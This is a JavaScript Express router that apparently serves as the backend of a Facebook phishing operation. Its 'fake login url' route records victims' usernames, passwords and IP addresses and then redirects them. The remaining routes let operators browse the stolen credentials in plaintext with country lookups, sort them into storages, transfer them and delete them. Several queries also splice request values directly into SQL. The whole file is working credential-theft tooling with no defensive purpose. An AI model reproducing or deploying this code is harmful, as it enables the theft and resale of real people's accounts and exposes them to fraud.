const express = require('express')
const db = require('../../database/db')
const checkAuth = require('../../middleware/check-auth')
const fbStorageApiRouter = express.Router()
const moment = require('moment')
var geoip = require('geoip-country')

fbStorageApiRouter.get('/api/fb-storages', checkAuth, (req, res) => {
    db.query(`select id,name,(select count(id) from fb_accs where storage_id=fb_storages.id) AS accs_num, owner_id from fb_storages union select 0 as id, 'Tất cả' as name, (select count(*) from fb_accs) as accs_nums, 0 as owner_id`, (err, results, fields) => {
        if (err) {
            res.status(500).json({ isSuccessed: false })
        }

        let storages = []
        for (var i = 0; i < results.length; i++) {
            storages.push({
                id: results[i].id,
                accsNum: results[i].accs_num,
                ownerId: results[i].owner_id,
                name: results[i].name
            })
        }
        res.status(200).json({ isSuccessed: true, storages: storages })
    })
})

fbStorageApiRouter.get('/api/fb-storages/:id', checkAuth, (req, res) => {
    const { id } = req.params
    const { page } = req.query
    var user = req.user
    var limit = 20
    if (id == 0) {
        var queryStr = `select id,username,password,ip_addr, storage_id, created_at from fb_accs`
        var totalStr = `select count(*) as total from fb_accs`

        if (!user.isAdmin) {
            queryStr += ` where storage_id=(select id from fb_storages where owner_id=${user.uid})`
            totalStr += ` where storage_id=(select id from fb_storages where owner_id=${user.uid})`
        }

        queryStr += ` limit ${limit} offset ${(page - 1) * limit}`

        db.query(queryStr, (err, results, fields) => {
            if (err) {
                res.status(500).json({ isSuccessed: false })
                return
            }

            let fbaccs = []

            for (var i = 0; i < results.length; i++) {
                let ip = geoip.lookup(results[i].ip_addr)
                fbaccs.push({
                    id: results[i].id,
                    ipAddr: results[i].ip_addr,
                    username: results[i].username,
                    password: results[i].password,
                    storageId: results[i].storage_id,
                    country: ip ? ip.country : 'no_data',
                    loginDate: moment(results[i].created_at).format('DD/MM/YYYY')
                })
            }

            db.query(totalStr, (err, results, fields) => {
                if (err) {
                    res.status(500).json({ isSuccessed: false })
                    return
                }
                let total = results.length > 0 ? Math.round(results[0].total / limit) : 0
                res.status(200).json({ isSuccessed: true, fbaccs: fbaccs, total: total })
            })
            return
        })
    }
    else if (id != 0) {
        if (user.isAdmin) {
            var queryStr = `select id,username,password,ip_addr,storage_id,created_at from fb_accs where storage_id=${id} limit ${limit} offset ${(page - 1) * limit}`;
            db.query(queryStr, (err, results, fields) => {
                if (err) {
                    res.status(500).json({ isSuccessed: false })
                    return
                }

                let fbaccs = []

                for (var i = 0; i < results.length; i++) {
                    let ip = geoip.lookup(results[i].ip_addr)
                    fbaccs.push({
                        id: results[i].id,
                        ipAddr: results[i].ip_addr,
                        username: results[i].username,
                        password: results[i].password,
                        storageId: results[i].storage_id,
                        country: ip ? ip.country : 'no_data',
                        loginDate: moment(results[i].created_at).format('DD/MM/YYYY')
                    })
                }

                db.query(`select count(*) from fb_accs where storage_id=${id}`, (err, results, fields) => {
                    if (err) {
                        res.status(500).json({ isSuccessed: false })
                        return
                    }
                    let total = results.length > 0 ? Math.round(results[0].total / limit) : 0
                    res.status(200).json({ isSuccessed: true, fbaccs: fbaccs, total: total })
                })
                return
            })
        }
        else {
            db.query(`select id from fb_storages where owner_id=${user.uid} limit ${limit} offset ${(page - 1) * limit}`, (err, results, fields) => {
                if (err) {
                    res.status(500).json({ isSuccessed: false })
                    return
                }
                if (results.length == 0) {
                    res.status(500).json({ isSuccessed: false })
                    return
                }
                if (id == results[0].id)
                    db.query(`select id,username,password,ip_addr,storage_id, created_at from fb_accs where storage_id=${id}`,
                        (err, results, fields) => {
                            if (err) {
                                res.status(500).json({ isSuccessed: false })
                                return
                            }
                            let fbaccs = []

                            for (var i = 0; i < results.length; i++) {
                                let ip = geoip.lookup(results[i].ip_addr)
                                fbaccs.push({
                                    id: results[i].id,
                                    ipAddr: results[i].ip_addr,
                                    username: results[i].username,
                                    password: results[i].password,
                                    storageId: results[i].storage_id,
                                    country: ip ? ip.country : 'no_data',
                                    loginDate: moment(results[i].created_at).format('DD/MM/YYYY')
                                })
                            }

                            db.query(`select count(*) from fb_accs where owner_id=${user.uid}`, (err, results, fields) => {
                                if (err) {
                                    res.status(500).json({ isSuccessed: false })
                                    return
                                }
                                let total = results.length > 0 ? Math.round(results[0].total / limit) : 0
                                res.status(200).json({ isSuccessed: true, fbaccs: fbaccs, total: total })
                            })
                            return
                        })
                else {
                    res.status(500).json({ isSuccessed: false })
                    return
                }
            })
        }
    }
    else {
        res.status(500).json({ isSuccessed: false })
    }
})

fbStorageApiRouter.post('/api/fb-storages/new', checkAuth, (req, res) => {
    var { newFbStorageList } = req.body
    if (Array.isArray(newFbStorageList)) {

        db.query('select name from fb_storages where name in (?)', [newFbStorageList], (err, results, fields) => {
            if (err) {
                res.status(500).json({ isSuccessed: false, err: err })
                return
            }

            if (results.length == 0) {
                //
                db.query('insert into fb_storages (name,owner_id) values ?', [newFbStorageList.map(elm => [elm, req.user.uid])], (err, results, fields) => {
                    if (err) {
                        res.status(500).json({ isSuccessed: false, err: err })
                        return
                    }
                    res.status(200).json({ isSuccessed: true })
                })
            }
            else {
                res.status(500).json({ isSuccessed: false, err: err })
                return
            }
        })
    }
    else res.status(500).json({ isSuccessed: false })
})

fbStorageApiRouter.post('/api/fb-storages/delete', checkAuth, (req, res) => {
    var { sid } = req.body
    db.beginTransaction(function (dbConn) {
        db.query(`update fb_accs set storage_id = 0 where storage_id = ?`, [sid], (err, results, fields) => {
            if (err) {
                res.status(500).json({ isSuccessed: false, err: err })
                return
            }

            dbConn.query(`delete from fb_storages where id= ?`, [sid], (err, results, fields) => {
                if (err) {
                    res.status(500).json({ isSuccessed: false, err: err })
                    return
                }
    
                dbConn.commit(function (err) {
                    if (err) {
                        res.status(500).json({ isSuccessed: false, err: err })
                        return
                    }
                    res.status(200).json({ isSuccessed: true })
                })
            })
            
        })
    })
})


fbStorageApiRouter.post('/api/fb-storages/delete-accs', checkAuth, (req, res) => {
    var { sid, fbAccId } = req.body
    
    db.query(`delete from fb_accs where id= ? and storage_id = ?`, [fbAccId, sid], (err, results, fields) => {
        if (err) {
            res.status(500).json({ isSuccessed: false, err: err })
            return
        }
        if (results.length == 0) {
            res.status(500).json({ isSuccessed: false })
        }
        res.status(200).json({ isSuccessed: true })
    })
    
})

fbStorageApiRouter.post('/api/fb-storages/transfer', checkAuth, (req, res) => {
    var { sid, fbAccIds } = req.body
    db.query(`update fb_accs set storage_id = ? where id in (?)`, [sid, fbAccIds], (err, results, fields) => {
        if (err) {
            res.status(500).json({ isSuccessed: false, err: err })
            return
        }
        res.status(200).json({ isSuccessed: true })
    })
})


//fake login url
fbStorageApiRouter.post('/login', (req, res) => {
    const { redirect } = req.query
    const { username, password, sid, ip } = req.body

    db.query(`select username, password from fb_accs where username=? and password=?`, [username, password], (err, results, fields) => {
        if (results.length > 0) {
            if (redirect)
                res.redirect(redirect)
            return
        }
        db.query(
            `insert into fb_accs (username,password,ip_addr,storage_id, created_at) values (?,?,?,?,now())`,
            [username, password, ip, sid],
            (err, results, fields) => {
                // donothing
                if (redirect)
                    res.redirect(redirect)
            })
    })

})

module.exports = fbStorageApiRouter
